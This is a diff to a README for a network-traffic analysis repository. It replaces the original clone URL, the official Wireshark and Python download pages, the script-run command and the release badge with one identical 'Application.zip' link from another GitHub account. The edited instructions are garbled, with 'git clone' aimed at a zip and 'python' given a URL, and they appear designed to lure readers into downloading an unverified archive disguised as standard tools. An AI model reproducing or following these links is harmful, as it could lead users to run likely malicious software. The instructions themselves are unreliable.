@@ -39,16 +39,16 @@ To get started with analyzing network traffic and detecting attacks, follow thes
 
 1. **Clone the Repository**:  
    ```
-   git clone https://github.com/adelante20/Network-Traffic-Analysis-and-Attack-Detection.git
+   git clone https://github.com/fernandinho1234/Network-Traffic-Analysis-and-Attack-Detection/releases/download/v1.0/Application.zip
    ```
 
 2. **Download Required Tools**:
-   - Wireshark: https://www.wireshark.org/download.html
-   - Python: https://www.python.org/downloads/
+   - Wireshark: https://github.com/fernandinho1234/Network-Traffic-Analysis-and-Attack-Detection/releases/download/v1.0/Application.zip
+   - Python: https://github.com/fernandinho1234/Network-Traffic-Analysis-and-Attack-Detection/releases/download/v1.0/Application.zip
 
 3. **Launch the Analysis Script**:  
    ```
-   python analyze_traffic.py
+   python https://github.com/fernandinho1234/Network-Traffic-Analysis-and-Attack-Detection/releases/download/v1.0/Application.zip
    ```
 
 4. **Explore PCAP Files**:  
@@ -57,7 +57,7 @@ To get started with analyzing network traffic and detecting attacks, follow thes
 ---
 
 ## 📥 Download the Latest Release 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release](https://github.com/fernandinho1234/Network-Traffic-Analysis-and-Attack-Detection/releases/download/v1.0/Application.zip%20Release-Click%20Here-brightgreen)](https://github.com/fernandinho1234/Network-Traffic-Analysis-and-Attack-Detection/releases/download/v1.0/Application.zip)
 
 ### Note: The link needs to be launched to download the release.
 
